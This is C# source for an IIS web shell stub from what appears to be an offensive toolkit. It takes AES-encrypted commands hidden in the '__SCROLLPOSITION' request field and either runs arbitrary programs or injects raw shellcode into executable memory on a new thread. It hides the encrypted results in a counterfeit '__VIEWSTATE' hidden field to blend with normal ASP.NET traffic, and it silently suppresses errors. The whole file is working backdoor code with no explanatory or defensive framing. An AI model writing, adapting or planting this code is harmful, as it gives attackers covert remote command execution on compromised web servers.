using System;
using System.Web;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;
using System.Text;
using System.IO;
using System.Security.Cryptography;

namespace Zcg.GMHFuckTools.ExampleStub
{
    public class IISRemoteStub
    {
        public IISRemoteStub()
        {
            try
            {
                HttpContext ctx = HttpContext.Current;
                if (HttpContext.Current != null)
                {
                    HttpRequest req = ctx.Request;
                    HttpResponse res = ctx.Response;
                    byte[] e = Convert.FromBase64String(req["__SCROLLPOSITION"]);

                    byte[] data = Dec(e);
                    try { res.Clear(); }
                    catch { }
                    string s = "";
                    switch (data[0])
                    {
                        case 0:
                            {
                                s = ProcessArch();
                                break;
                            }
                        case 1:
                            {
                                s = ShellCode(data, 1).ToString();
                                break;
                            }
                        case 2:
                            {
                                MemoryStream ms = new MemoryStream(data);
                                ms.Position = 1;
                                BinaryReader br = new BinaryReader(ms);
                                s = Run(br.ReadString(), br.ReadString());
                                break;
                            }
                        default:
                            {
                                s = "Unknown opcode";
                                break;
                            }
                    }
                    res.Write(@"<input type=""hidden"" name=""__VIEWSTATE"" id=""__VIEWSTATE"" value=""/wEPDwUKLTcyODc4" + Convert.ToBase64String(Enc(Encoding.UTF8.GetBytes(s))) + @""" />");
                    res.End();
                }
            }
            catch { }
        }
        public static byte[] Dec(byte[] data)
        {
            byte[] iv = new byte[0x10];
            byte[] k = new byte[0x10];
            Array.Copy(data, 0, iv, 0, 0x10);
            Array.Copy(data, 0x10, k, 0, 0x10);
            Console.WriteLine(new Guid(iv));
            Console.WriteLine(new Guid(k));
            MemoryStream ms = new MemoryStream();
            RijndaelManaged aes = new RijndaelManaged();
            aes.BlockSize = 128;
            aes.KeySize = 128;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(k, iv), CryptoStreamMode.Write);
            cs.Write(data, 0x20, data.Length - 0x20);
            cs.FlushFinalBlock();
            return ms.ToArray();
        }
        public static byte[] Enc(byte[] data)
        {
            byte[] iv = Guid.NewGuid().ToByteArray();
            byte[] k = Guid.NewGuid().ToByteArray();
            MemoryStream ms = new MemoryStream();
            ms.Write(iv, 0, iv.Length);
            ms.Write(k, 0, k.Length);
            RijndaelManaged aes = new RijndaelManaged();
            aes.BlockSize = 128;
            aes.KeySize = 128;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(k, iv), CryptoStreamMode.Write);
            cs.Write(data, 0, data.Length);
            cs.FlushFinalBlock();
            return ms.ToArray();
        }
        public static string Run(string proc, string arg)
        {
            try
            {
                Process p = new Process();
                p.StartInfo.FileName = proc;
                p.StartInfo.Arguments = arg;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.Start();
                p.WaitForExit();
                return p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
            }
            catch (Exception ex)
            {
                return ex.ToString();
            }
        }
        public static bool ShellCode(byte[] sc, int pos)
        {
            try
            {
                IntPtr p = VirtualAlloc(IntPtr.Zero, 0x1000, 0x1000, 0x40);
                Marshal.Copy(sc, pos, p, sc.Length - pos);
                new Thread(Marshal.GetDelegateForFunctionPointer(p, typeof(ThreadStart)) as ThreadStart).Start();
                return true;
            }
            catch { return false; }
        }
        public static string ProcessArch()
        {
            return Marshal.SizeOf(typeof(IntPtr)) == 8 ? "x64" : "x86";
        }
        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);
    }
}